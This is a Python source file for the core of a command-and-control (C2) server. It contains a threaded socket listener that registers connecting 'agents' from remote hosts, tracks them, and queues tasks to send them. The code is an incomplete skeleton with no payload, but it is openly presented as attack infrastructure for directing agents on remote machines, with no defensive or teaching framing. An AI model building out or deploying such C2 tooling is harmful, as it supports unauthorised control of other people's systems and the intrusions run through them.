"""C2 Server Core - Listener, Agent Manager, Task Queue"""
import socket, threading, json, time, hashlib, os
from datetime import datetime

class Agent:
    def __init__(self, agent_id, remote_addr, hostname="", os_info=""):
        self.id = agent_id
        self.remote_addr = remote_addr
        self.hostname = hostname
        self.os_info = os_info
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.tasks = []
        self.results = []
        self.alive = True

class TaskQueue:
    def __init__(self):
        self.pending = {}
        self.completed = {}
    
    def add_task(self, agent_id, task_type, params):
        task_id = hashlib.md5(f"{time.time()}{agent_id}".encode()).hexdigest()[:12]
        task = {"id": task_id, "type": task_type, "params": params, "status": "pending", "created": str(datetime.now())}
        self.pending.setdefault(agent_id, []).append(task)
        return task_id
    
    def get_tasks(self, agent_id):
        tasks = self.pending.pop(agent_id, [])
        return tasks
    
    def complete_task(self, task_id, result):
        self.completed[task_id] = {"result": result, "completed": str(datetime.now())}

class C2Server:
    def __init__(self, config):
        self.config = config
        self.agents = {}
        self.task_queue = TaskQueue()
        self.running = False
        self.listeners = []
    
    def start(self):
        self.running = True
        print(f"[*] C2 Server starting on {self.config.listen_host}:{self.config.listen_port}")
        listener = threading.Thread(target=self._listen, daemon=True)
        listener.start()
        self.listeners.append(listener)
    
    def _listen(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.config.listen_host, self.config.listen_port))
        sock.listen(self.config.max_agents)
        while self.running:
            try:
                conn, addr = sock.accept()
                threading.Thread(target=self._handle_agent, args=(conn, addr), daemon=True).start()
            except: break
    
    def _handle_agent(self, conn, addr):
        agent_id = hashlib.md5(f"{addr}{time.time()}".encode()).hexdigest()[:16]
        agent = Agent(agent_id, addr)
        self.agents[agent_id] = agent
        print(f"[+] New agent: {agent_id} from {addr}")
    
    def stop(self):
        self.running = False
        print("[*] C2 Server stopped")
    
    def list_agents(self):
        return [{"id": a.id, "addr": str(a.remote_addr), "host": a.hostname, "last_seen": str(a.last_seen)} for a in self.agents.values() if a.alive]
    
    def task_agent(self, agent_id, task_type, params=None):
        return self.task_queue.add_task(agent_id, task_type, params or {})
